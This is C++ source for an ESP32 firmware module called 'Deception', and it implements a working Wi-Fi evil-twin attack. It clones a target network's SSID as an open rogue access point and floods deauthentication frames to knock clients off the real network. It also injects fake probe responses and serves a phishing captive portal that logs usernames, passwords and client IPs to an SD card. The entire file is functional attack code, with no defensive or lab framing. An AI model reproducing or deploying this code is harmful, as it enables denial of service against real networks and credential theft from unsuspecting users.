#include "Deception.h"
#include "../../include/config.h"
#include <Arduino.h>
#include <SD.h>
#include <esp_wifi.h>
#include <lwip/ip_addr.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>

// ============================================================
//  Deception — implementation
// ============================================================

extern uint32_t g_packetCount;
extern uint8_t  g_currentChannel;
extern bool     g_sdReady;

Deception* Deception::s_instance = nullptr;

Deception::Deception() {
    _steps[0] = { "Evil Twin AP",          "Clone target SSID as rogue AP"       };
    _steps[1] = { "Deauth flood",          "Disconnect clients from real AP"     };
    _steps[2] = { "Fake probe responses",  "Lure devices to Evil Twin"           };
    _steps[3] = { "Captive portal",        "Serve login page, log credentials"   };
    _steps[4] = { "Monitor associations",  "Count clients that joined Evil Twin" };
}

Deception::~Deception() {
    delete _httpServer;
}

const char* Deception::getName() const { return "CONFUSE THE FIELD"; }

StepStatus Deception::getStatus() const { return _status; }

const PipelineStep* Deception::getSteps(uint8_t& count) const {
    count = STEP_COUNT;
    return _steps;
}

void Deception::init() {
    s_instance = this;
    _creds.reserve(PORTAL_CRED_RING_SIZE);
}

void Deception::setTarget(const APRecord& ap) {
    _targetAP  = ap;
    _hasTarget = true;
}

void Deception::run() {
    _stop   = false;
    _status = StepStatus::RUNNING;
    _creds.clear();
    _associationCount = 0;
    for (auto& s : _steps) s.status = StepStatus::IDLE;

    auto runStep = [&](uint8_t idx, bool (Deception::*fn)()) {
        if (_stop) { _steps[idx].status = StepStatus::SKIP; return; }
        _steps[idx].status = StepStatus::RUNNING;
        bool ok = (this->*fn)();
        _steps[idx].status = ok ? StepStatus::OK : StepStatus::FAIL;
    };

    runStep(0, &Deception::stepEvilTwinAP);
    // Steps 1 and 2 require a specific target AP to attack
    if (!_hasTarget) {
        _steps[1].status = StepStatus::SKIP;
        _steps[2].status = StepStatus::SKIP;
    } else {
        runStep(1, &Deception::stepDeauthFlood);
        runStep(2, &Deception::stepFakeProbeResponses);
    }
    runStep(3, &Deception::stepCaptivePortal);
    runStep(4, &Deception::stepMonitorAssociations);

    stopEvilTwinAP();
    saveCreds();
    _status = StepStatus::OK;
}

void Deception::stop() {
    _stop = true;
    if (_portalTask) { vTaskDelete(_portalTask); _portalTask = nullptr; }
    stopEvilTwinAP();
}

// ── Evil Twin AP ───────────────────────────────────────────────
bool Deception::stepEvilTwinAP() {
    const char* ssid    = _hasTarget ? _targetAP.ssid : EVIL_TWIN_DEFAULT_SSID;
    uint8_t     channel = _hasTarget ? _targetAP.channel : EVIL_TWIN_CHANNEL;

    startEvilTwinAP(ssid, channel);
    return true;
}

void Deception::startEvilTwinAP(const char* ssid, uint8_t channel) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t apCfg{};
    memcpy(apCfg.ap.ssid, ssid, strlen(ssid));
    apCfg.ap.ssid_len     = strlen(ssid);
    apCfg.ap.channel      = channel;
    apCfg.ap.authmode     = WIFI_AUTH_OPEN;
    apCfg.ap.max_connection = 8;

    esp_wifi_set_config(WIFI_IF_AP, &apCfg);
    esp_wifi_start();
}

void Deception::stopEvilTwinAP() {
    if (_httpServer) { _httpServer->stop(); }
    esp_wifi_stop();
}

// ── Captive Portal ─────────────────────────────────────────────
bool Deception::stepCaptivePortal() {
    setupCaptivePortal();

    // Start portal HTTP handler in a FreeRTOS task
    xTaskCreate(portalTaskFn, "portal", 4096, this, 3, &_portalTask);

    // Run for a timed window or until stopped
    uint32_t deadline = millis() + 60000;  // 60s portal window
    while (millis() < deadline && !_stop) delay(200);

    if (_portalTask) {
        vTaskDelete(_portalTask);
        _portalTask = nullptr;
    }
    return true;
}

void Deception::setupCaptivePortal() {
    delete _httpServer;
    _httpServer = new WebServer(80);

    _httpServer->on("/", HTTP_GET, [this]() {
        String page;
        if (EVIL_TWIN_PORTAL_TYPE == 0) {
            page = R"html(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>body{font-family:sans-serif;background:#1a1a2e;color:#eee;
display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
.box{background:#16213e;padding:2em;border-radius:8px;min-width:280px;}
h2{color:#e94560;margin:0 0 1em;}
input{width:100%;padding:.6em;margin:.4em 0;border:1px solid #444;
border-radius:4px;background:#0f3460;color:#eee;box-sizing:border-box;}
button{width:100%;padding:.7em;background:#e94560;color:#fff;border:none;
border-radius:4px;cursor:pointer;margin-top:.5em;font-size:1em;}
</style></head><body><div class="box">
<h2>Network Authentication</h2>
<form method="POST" action="/auth">
<input name="username" placeholder="Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>)html";
        } else {
            page = "<html><body><h1>Redirecting...</h1></body></html>";
        }
        _httpServer->send(200, "text/html", page);
    });

    _httpServer->on("/auth", HTTP_POST, [this]() {
        String user = _httpServer->arg("username");
        String pass = _httpServer->arg("password");

        if (_creds.size() < PORTAL_CRED_RING_SIZE) {
            CredentialCapture cap{};
            strncpy(cap.username, user.c_str(), sizeof(cap.username) - 1);
            strncpy(cap.password, pass.c_str(), sizeof(cap.password) - 1);
            _httpServer->client().remoteIP().toString().toCharArray(
                cap.client_ip, sizeof(cap.client_ip));
            cap.timestamp = millis();
            _creds.push_back(cap);
        }

        // Redirect to a plausible success page
        _httpServer->sendHeader("Location", "/success");
        _httpServer->send(302, "text/plain", "");
    });

    _httpServer->on("/success", HTTP_GET, [this]() {
        _httpServer->send(200, "text/html",
            "<html><body><h1>Connected</h1><p>You are now online.</p></body></html>");
    });

    // Catch-all: redirect everything to our portal (DNS hijack not shown;
    // a full implementation would also run a DNS server redirecting all A-record
    // queries to our AP IP, typically 192.168.4.1)
    _httpServer->onNotFound([this]() {
        _httpServer->sendHeader("Location", "http://192.168.4.1/");
        _httpServer->send(302, "text/plain", "");
    });

    _httpServer->begin();
}

void Deception::portalTaskFn(void* arg) {
    Deception* self = static_cast<Deception*>(arg);
    while (!self->_stop) {
        if (self->_httpServer) self->_httpServer->handleClient();
        delay(5);
    }
    vTaskDelete(nullptr);
}

// ── Deauth flood ───────────────────────────────────────────────
bool Deception::stepDeauthFlood() {
    if (!_hasTarget) return false;

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frame[26];
    build_deauth(frame, broadcast, _targetAP.bssid, 0x0007);

    esp_wifi_set_channel(_targetAP.channel, WIFI_SECOND_CHAN_NONE);
    g_currentChannel = _targetAP.channel;

    uint32_t deadline = millis() + 30000;  // 30s flood window
    while (millis() < deadline && !_stop) {
        for (int i = 0; i < DEAUTH_BURST_COUNT && !_stop; i++) {
            inject_frame(WIFI_IF_STA, frame, 26);
            delay(2);
        }
        delay(DEAUTH_BURST_INTERVAL_MS);
    }
    return true;
}

// ── Fake probe responses ───────────────────────────────────────
bool Deception::stepFakeProbeResponses() {
    // Send probe responses with our Evil Twin SSID to attract devices
    // that have that network in their preferred list.
    if (!_hasTarget) return false;

    uint8_t myMac[6];
    esp_wifi_get_mac(WIFI_IF_AP, myMac);

    // Build a minimal probe response frame
    // (same structure as a beacon with subtype 0x05)
    uint8_t probeResp[64] = {};
    probeResp[0] = 0x50; probeResp[1] = 0x00;  // FC: Probe Response
    memset(probeResp + 4, 0xFF, 6);              // DA: broadcast
    memcpy(probeResp + 10, myMac, 6);            // SA: us
    memcpy(probeResp + 16, myMac, 6);            // BSSID: us

    // Fixed fields: timestamp(8) + interval(2) + cap(2)
    int off = 24;
    memset(probeResp + off, 0, 8); off += 8;  // timestamp
    probeResp[off++] = 0x64; probeResp[off++] = 0x00;  // interval 100 TU
    probeResp[off++] = 0x01; probeResp[off++] = 0x04;  // capability: ESS

    // SSID IE
    const char* ssid = _targetAP.ssid;
    uint8_t ssidLen  = strlen(ssid);
    probeResp[off++] = 0x00;      // IE id = SSID
    probeResp[off++] = ssidLen;
    memcpy(probeResp + off, ssid, ssidLen);
    off += ssidLen;

    uint32_t deadline = millis() + 10000;
    while (millis() < deadline && !_stop) {
        inject_frame(WIFI_IF_AP, probeResp, off);
        delay(50);
    }
    return true;
}

// ── Monitor associations ────────────────────────────────────────
void IRAM_ATTR Deception::monitorCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_instance) return;
    s_instance->countAssocFrame(static_cast<wifi_promiscuous_pkt_t*>(buf));
}

void Deception::countAssocFrame(const wifi_promiscuous_pkt_t* pkt) {
    const uint8_t* pl  = pkt->payload;
    uint16_t       len = pkt->rx_ctrl.sig_len;
    if (len < 26) return;

    uint16_t fc;
    memcpy(&fc, pl, 2);
    uint8_t fsubtype = (fc >> 4) & 0x0F;
    // Association Request (0x00) or Re-Association Request (0x02)
    if (fsubtype != 0x00 && fsubtype != 0x02) return;

    // BSSID = addr3 (offset 16); check it matches our Evil Twin
    uint8_t myMac[6];
    esp_wifi_get_mac(WIFI_IF_AP, myMac);
    if (memcmp(pl + 16, myMac, 6) != 0) return;

    _associationCount++;
}

bool Deception::stepMonitorAssociations() {
    // Switch to AP+STA mode so we can enable promiscuous while AP stays up
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(monitorCb);

    uint8_t ch = _hasTarget ? _targetAP.channel : EVIL_TWIN_CHANNEL;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    g_currentChannel = ch;

    uint32_t deadline = millis() + 15000;  // 15s observation window
    while (millis() < deadline && !_stop) delay(200);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_mode(WIFI_MODE_AP);  // restore pure AP mode

    // Log association count to SD
    if (g_sdReady) {
        char path[64];
        snprintf(path, sizeof(path), "%s/deception_%lu.txt",
                 SD_LOG_DIR, millis() / 1000);
        File f = SD.open(path, FILE_WRITE);
        if (f) {
            f.printf("# Deception summary\n");
            f.printf("Associations observed : %lu\n", (uint32_t)_associationCount);
            f.printf("Credentials captured  : %d\n",  (int)_creds.size());
            f.close();
        }
    }
    return true;
}

void Deception::saveCreds() {
    if (!g_sdReady || _creds.empty()) return;
    char path[64];
    snprintf(path, sizeof(path), "%s/creds_%lu.txt", SD_LOG_DIR, millis() / 1000);
    File f = SD.open(path, FILE_WRITE);
    if (!f) return;
    f.println("# Captured credentials");
    for (const auto& c : _creds) {
        char line[180];
        snprintf(line, sizeof(line), "[%lu] %s | user:%s pass:%s",
                 c.timestamp, c.client_ip, c.username, c.password);
        f.println(line);
    }
    f.close();
}
